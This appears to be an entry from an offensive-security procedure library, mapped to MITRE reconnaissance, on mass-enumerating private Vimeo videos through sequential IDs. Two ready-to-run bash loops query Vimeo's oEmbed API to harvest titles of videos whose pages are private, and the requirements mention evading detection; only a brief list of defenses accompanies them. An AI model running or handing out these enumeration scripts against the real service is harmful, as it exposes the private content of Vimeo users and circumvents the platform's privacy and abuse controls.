---
tags:
  - enumeration
  - id-guessing
type: procedure
tools: []
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-vimeo-oembed-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Active Scanning]]'
updated_at: '2025-12-14T17:32:01.474Z'
sub_techniques: []
id: 4ed74a63-746d-467f-9be0-df6ae731e5b8
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Active Scanning]]'
---
# Enumerate-Private-Videos-via-Sequential-IDs

## Summary

This procedure leverages sequential video IDs to mass-enumerate private videos, harvesting titles where the API discloses data despite privacy settings.

## Description

Vimeo video IDs are incremental, allowing attackers to loop through ranges (e.g., 1-100000) and filter API responses that return titles while pages 404, potentially exposing thousands of sensitive videos.

## Requirements

1. Scripting capability (e.g., bash loop with curl)
2. jq for JSON parsing (optional)
3. Rate limiting awareness to avoid detection

## Defense

Defensive measures and detection strategies:

- Randomize or obscure resource IDs
- Rate limit and CAPTCHA on sequential queries
- Monitor for high-volume API access patterns

## Objectives

1. Harvest titles from private videos at scale
2. Identify patterns in sensitive content
3. Demonstrate enumeration feasibility

## Instructions

### Step 1: Script Sequential ID Queries

**Context**: Iterate over ID range, querying the API.

**Command** ([[commands/curl-vimeo-oembed-test]]):
```bash
for id in {100000..100100}; do echo "ID: $id"; curl -s "https://vimeo.com/api/oembed.json?url=https%3A//vimeo.com/$id" | jq -r '.title // empty'; done
```

> Outputs titles for disclosing videos, empty for others.

### Step 2: Filter and Validate Disclosures

**Context**: Cross-check with page access to confirm privates.

**Command** ([[commands/curl-vimeo-oembed-test]]):
```bash
for id in $(seq 100000 100100); do if curl -s -o /dev/null -w "%{http_code}" "https://vimeo.com/$id" | grep -q 404 && [ -n "$(curl -s "https://vimeo.com/api/oembed.json?url=https%3A//vimeo.com/$id" | jq -r .title)" ]; then echo "Private Title: $(curl -s "https://vimeo.com/api/oembed.json?url=https%3A//vimeo.com/$id" | jq -r .title)"; fi; done
```

> Lists only private titles disclosed by API.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]]

### Techniques

- [[Active Scanning]]

### Sub-Techniques


## Commands Used

- [[commands/curl-vimeo-oembed-test]]

## Tools Used


## Tags

- [[enumeration]]
- [[id-guessing]]
